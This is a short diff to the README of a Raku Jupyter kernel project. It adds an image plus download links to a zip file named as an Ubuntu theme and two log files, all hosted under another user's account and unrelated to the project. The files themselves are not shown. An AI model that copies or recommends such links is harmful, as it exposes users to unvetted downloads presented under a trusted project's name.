@@ -1,3 +1,7 @@
+![Blue Dreams](https://user-images.githubusercontent.com/84486510/193418571-05f8911b-3439-4bae-b817-cde19923910b.jpg)
+[edinsonrequena.linux-ubuntu-theme-0.0.1.zip](https://github.com/todstephens80/p6-jupyter-kernel/files/9690732/edinsonrequena.linux-ubuntu-theme-0.0.1.zip)
+[github.com-1664326611872.log](https://github.com/todstephens80/p6-jupyter-kernel/files/9690734/github.com-1664326611872.log)
+[github.com-1664326751910.log](https://github.com/todstephens80/p6-jupyter-kernel/files/9690735/github.com-1664326751910.log)
 Jupyter::Kernel for Raku
 ----------------
 [![Binder](https://binder.pangeo.io/badge_logo.svg)](https://mybinder.org/v2/gh/bduggan/p6-jupyter-kernel/master?filepath=hello-world.ipynb)
